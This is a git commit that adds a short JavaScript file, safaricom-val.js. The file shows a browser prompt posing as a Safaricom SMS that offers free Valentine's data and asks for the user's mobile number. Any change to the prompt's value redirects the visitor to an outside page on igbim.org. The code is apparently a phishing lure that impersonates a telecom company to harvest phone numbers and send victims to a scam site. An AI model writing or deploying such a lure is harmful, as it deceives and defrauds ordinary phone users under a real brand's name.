f04558b60c2dd3bd24e0a6a0ae41b8140b5e82bb
mfednewblog9 <newekpeitid@gmail.com>
2026-02-13 05:45:00 +0100

    Create safaricom-val.js

---
+++ safaricom-val.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVATE VALENTINES OFFER'
+password=prompt('SMS: Congratulations, your Safaricom Number is eligible to receive 1 Month Free Data Valentines Offer, click OK to Enter Your Mobile Number','ACTIVATE VALENTINES OFFER');
+if (password != 'ACTIVATE VALENTINES OFFER') {
+location.href='https://igbim.org/safaricom.html';
+}
